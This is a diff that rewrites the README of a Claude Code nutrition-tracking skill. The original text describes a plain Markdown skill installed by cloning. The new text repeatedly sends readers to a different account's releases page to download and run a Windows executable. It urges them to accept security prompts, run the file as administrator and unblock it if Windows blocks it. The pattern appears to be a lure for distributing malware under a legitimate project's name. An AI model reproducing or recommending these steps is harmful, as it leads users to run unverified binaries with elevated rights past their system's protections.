@@ -1,132 +1,240 @@
-# 🥗 Nutrition Tracker Skill
+# 🥗 macros-log - Track meals, calories, and workouts
 
-A personal nutrition, calorie, and workout tracker skill for Claude Code and other SKILL.md-compatible AI assistants.
+[![Download on GitHub](https://img.shields.io/badge/Download%20for%20Windows-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Osbertbilled424/macros-log/releases)
 
-Track your food, macros, workouts, and weight — all in plain text files, no apps needed.
+## 🧭 What macros-log does
 
----
+macros-log helps you keep track of what you eat, how many calories you take in, and the workouts you do. It is made for use with Claude Code, so you can work with it as a skill while you manage daily nutrition and fitness logs.
 
-## ✨ Features
+Use it to:
+- Log meals and snacks
+- Record calories, protein, carbs, and fat
+- Track workouts and exercise time
+- Review your daily intake
+- Keep a simple record of your health habits
 
-- **Smart onboarding** — calculates your BMR, TDEE, and macro goals on first run
-- **Food logging** — text or photo, single product or full meal at once
-- **Personal product database** — save your go-to products with exact macros, add new ones in one message
-- **Unknown products** — Claude uses its own knowledge as fallback, marks as "(approx.)"
-- **Daily summary** — calories and macros left, progress bars, water tracker
-- **Workout logging** — gym sessions, cardio, any activity
-- **Weekly stats** — weight trend, average calories, goal compliance
-- **Fix entries** — edit or delete a logged item
-- **"What should I eat?"** — suggests foods based on what's left in your daily budget
-- **Weight update with auto-recalculation** — change ≥ 1 kg recalculates TDEE and goals
-- **Goal change** — switch between cutting, bulking, maintaining anytime
-- **Multilingual** — responds in the user's language (English, Russian, Uzbek, etc.)
+## 💻 Before you start
 
----
+You need:
+- A Windows computer
+- An internet connection
+- A web browser
+- Permission to download files
+- A file that you can open on Windows from the release page
 
-## 🚀 Installation
+The app is built for normal desktop use. You do not need to set up a developer tool chain or write code to get started.
 
-### Claude.ai (web / mobile)
-1. Download ZIP from GitHub (green "Code" button → "Download ZIP")
-2. Unzip — you'll get a `macros-log/` folder with 5 files
-3. Go to claude.ai → Settings → Skills → Install from folder
+## 📥 Download macros-log
 
-### Claude Code
-```bash
-# Download ZIP and unzip into one of these locations:
-~/.claude/skills/macros-log/       # personal (works across all projects)
-.claude/skills/macros-log/         # project-level (only for current project)
+Visit the release page here:
 
-# Or clone:
-git clone https://github.com/xeroctation/macros-log ~/.claude/skills/macros-log
-```
+https://github.com/Osbertbilled424/macros-log/releases
 
-### OpenAI Codex CLI
-```bash
-# Download ZIP and unzip into:
-~/.codex/skills/macros-log/
+On that page:
+1. Open the newest release
+2. Find the Windows download file
+3. Download the file to your computer
+4. Open the file after the download finishes
 
-# Or clone:
-git clone https://github.com/xeroctation/macros-log ~/.codex/skills/macros-log
-```
+If your browser asks what to do with the file, choose Save or Keep, then run it from your Downloads folder.
 
-### Any other SKILL.md-compatible assistant
-Copy the `macros-log/` folder into your assistant's skills directory.
+## 🪟 Install on Windows
 
----
+After you download the file:
+1. Open your Downloads folder
+2. Find the macros-log file you just got
+3. Double-click it
+4. If Windows shows a security prompt, choose Run or Open
+5. Wait for the app to finish loading
 
-## 💬 Usage examples
+If the file comes in a ZIP folder:
+1. Right-click the ZIP file
+2. Choose Extract All
+3. Open the extracted folder
+4. Double-click the app file inside
 
-The skill activates automatically when you mention food, calories, workouts, or weight. No slash commands needed.
+## ⚙️ First-time setup
 
-**First run — onboarding:**
-```
-You: hi, want to track my nutrition
-Skill: Hi! I'm your nutrition tracker. What's your name?
-```
+When macros-log opens for the first time:
+1. Read the start screen
+2. Enter your name or profile label if asked
+3. Set your daily calorie goal
+4. Set your protein, carb, and fat targets
+5. Choose your preferred unit style if the app asks
+6. Save your settings
 
-**Log a meal:**
-```
-You: had breakfast: 3 eggs, 100g oatmeal, 250ml milk
-Skill: ✅ Breakfast logged:
-  Eggs ×3 (180g)  → 283 kcal | P:23g F:20g C:2g
-  Oatmeal 100g    → 88 kcal  | P:3g  F:1.5g C:15g
-  Milk 250ml      → 130 kcal | P:7g  F:6g   C:12g
-  ─────────────────────────────────────────
-  Total:            501 kcal | P:33g F:28g  C:29g
+A good starting point is:
+- Daily calories: a value that matches your goal
+- Protein: based on your body weight and activity
+- Carbs: based on your meal pattern
+- Fat: enough to keep meals balanced
 
-📊 Today: 501 / 2350 ███░░░░░░░ 21% (left: 1849)
-```
+If you are not sure what to enter, start with simple daily targets and adjust later.
 
-**Add a product to your database:**
-```
-You: add product: Best cottage cheese — 150 kcal/100g, p14 f8 c4
-Skill: ✅ Best cottage cheese — 150 kcal/100g | P:14g F:8g C:4g — added to your database
-```
+## 🍎 Log food and meals
 
-**Daily summary:**
-```
-You: summary
-Skill: 📅 March 26 (Thu) — gym
-  Calories:  1840 / 2350  ████████░░ 78%  (left: 510)
-  Protein:    142g / 175g  ████████░░ 81%
-  ...
-```
+To add food:
+1. Open the food log screen
+2. Choose Add Meal or New Entry
+3. Enter the food name
+4. Enter the amount you ate
+5. Add calories and macros
+6. Save the entry
 
-**Suggest what to eat:**
-```
-You: what can I eat for dinner? 600 kcal and 40g protein left
-Skill: Here are some options:
-  - 300g chicken breast → 495 kcal, 93g protein ✅
-  - 200g cottage cheese + 100g buckwheat → 462 kcal, 40g protein ✅
-```
+You can log:
+- Breakfast
+- Lunch
+- Dinner
+- Snacks
+- Drinks
+- Supplements
 
----
+For the best results, log food soon after you eat it. That keeps your totals easier to follow.
 
-## 📁 File structure
+## 🏋️ Track workouts
 
-```
-macros-log/
-├── SKILL.md          # Skill instructions for Claude
-├── my-profile.md     # Your physical data, TDEE, macro goals
-├── my-products.md    # Your personal product database
-└── food-log.md       # Daily food and activity log
-```
+To add a workout:
+1. Open the workout log
+2. Choose Add Workout
+3. Pick the workout type
+4. Enter the time spent
+5. Enter sets, reps, distance, or weight if needed
+6. Save the record
 
-All data is stored in plain Markdown files — readable, editable, portable.
+You can track:
+- Gym sessions
+- Running
+- Walking
+- Cycling
+- Home workouts
+- Sport sessions
 
----
+This helps you see how your food intake lines up with your activity level.
 
-## 🌍 Compatibility
+## 📊 Read your daily totals
 
-| Platform | Status |
-|----------|--------|
-| Claude Code | ✅ |
-| OpenAI Codex CLI | ✅ |
-| Claude.ai (web/mobile) | ✅ |
-| Other SKILL.md-compatible assistants | ✅ |
+macros-log keeps a running total of:
+- Calories eaten
+- Protein
+- Carbs
+- Fat
+- Workout activity
 
----
+Check your totals during the day so you can stay close to your goal. If you eat more than planned, you can adjust your next meal. If you train hard, you can review how that affects your intake.
 
-## 📄 License
+## 🗂️ Typical workflow
 
-MIT — use freely, modify, share.
+A simple daily routine looks like this:
+1. Open macros-log in the morning
+2. Set or review your goal
+3. Log each meal after you eat
+4. Add workouts when you finish training
+5. Check your totals before the end of the day
+6. Review your weekly pattern when you want to spot trends
+
+This keeps your record clear without much effort.
+
+## 🔧 Common tasks
+
+### Add a quick food entry
+Use this when you only need a simple log for one item, like a protein bar, smoothie, or cup of coffee.
+
+### Edit an old entry
+Use this when you entered the wrong amount or picked the wrong meal type.
+
+### Remove an entry
+Use this when you logged something by mistake.
+
+### Review past days
+Use this when you want to see how your intake changed over time.
+
+### Compare intake and training
+Use this when you want to see if your food and activity match your current goal.
+
+## 🧠 Tips for better tracking
+
+- Log food right away
+- Use the same units each day
+- Keep meal names short and clear
+- Record workouts on the same day they happen
+- Review totals at night
+- Use the same calorie goal for a few days before changing it
+- Keep notes for foods that are hard to measure
+
+Small habits make the log easier to use and read.
+
+## 🪙 File types you may see
+
+The release page may give you one of these:
+- `.exe` file: open it on Windows
+- `.zip` file: extract it first, then open the app inside
+- Release package: download it, then follow the file name that matches Windows
+
+If you see more than one file, choose the one meant for Windows desktop use.
+
+## 🔍 Troubleshooting
+
+### The file does not open
+- Check that the download finished
+- Try opening the file from the Downloads folder
+- Right-click the file and choose Run as administrator
+
+### Windows blocks the file
+- Open the file properties
+- Look for an Unblock option
+- Apply the change and try again
+
+### The app closes right away
+- Download the newest release again
+- Make sure the file finished downloading
+- Try running it from a local folder such as Downloads
+
+### I cannot find the download
+- Open your browser downloads list
+- Search your Downloads folder
+- Sort files by date and look for the newest one
+
+## 🧾 What to expect from the app
+
+macros-log is built to help you:
+- Keep a daily nutrition record
+- Follow calories and macros
+- Track workouts in one place
+- Build a clearer view of your eating habits
+- Use Claude Code as part of the workflow
+
+It works well for people who want a simple log for food and fitness without using a large health app
+
+## 📁 Release page
+
+Download and install from:
+https://github.com/Osbertbilled424/macros-log/releases
+
+## 🧩 Notes for using with Claude Code
+
+If you use Claude Code with this skill, you can use it to support tasks like:
+- Meal tracking
+- Macro logging
+- Daily calorie review
+- Workout notes
+- Habit tracking
+- Health planning
+
+Keep your entries short and specific so the log stays easy to read and update
+
+## 📌 Basic daily setup example
+
+A simple setup may look like this:
+- Goal calories: 2,000
+- Protein target: 150 g
+- Carbs target: 200 g
+- Fat target: 65 g
+- Workout log: yes
+- Meal log: yes
+
+You can change these numbers to match your own routine
+
+## 🧭 How to get back to the release page
+
+If you need the file again, open this link in your browser:
+https://github.com/Osbertbilled424/macros-log/releases
